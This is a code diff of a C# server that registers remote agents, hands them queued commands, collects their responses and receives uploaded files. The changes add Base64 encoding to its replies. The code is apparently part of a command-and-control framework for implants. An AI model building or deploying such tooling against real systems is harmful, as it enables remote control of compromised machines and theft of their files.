@@ -158,22 +158,25 @@ namespace server{
                 //register the agent
                 int registration = await RegisterAgent(hostname, root);
                 if (registration == 0){
-                    return "{\"registered\":\"true\"}";
+                    return Base64EncodeString("{\"registered\":\"true\"}");
                 } 
                 return "{\"registered\":\"false\"}";
+
             } else if (root.TryGetProperty("command", out JsonElement query)){
                 //respond to the client who wants their commandQue
                 LogServer($"command query from {hostname}");
                 if (this.agents.TryGetValue(hostname.GetString(), out Agent agent)){
                     var jsonCommandQue = JsonSerializer.Serialize(agent.commandQue);
                     agent.commandQue.Clear();
-                    return FormatCommand(jsonCommandQue);
+                    return Base64EncodeString(FormatCommand(jsonCommandQue));
                 }
                 return "{\"response\": \"Client not found!\"}";
+
             } else if (root.TryGetProperty("response", out JsonElement response)) {
                 //get and parse a client response
                 this.agents[hostname.GetString()].commandResp.Add(Base64DecodeString(response.ToString()));
                 return Base64EncodeString("{\"response\": \"thanks\"}");
+
             } else if (root.TryGetProperty("file", out JsonElement fileinfo)){
                 JsonElement filename = root.GetProperty("filename");
                 // this.filePath
@@ -182,6 +185,7 @@ namespace server{
 
                 this.agents[hostname.GetString()].commandResp.Add($"File received and written to {this.filePath}/{filename.GetString()}");
                 return Base64EncodeString("{\"response\": \"thanks for the file\"}");
+
             } else {
                 return HttpStatusCode.NotFound.ToString();
             }
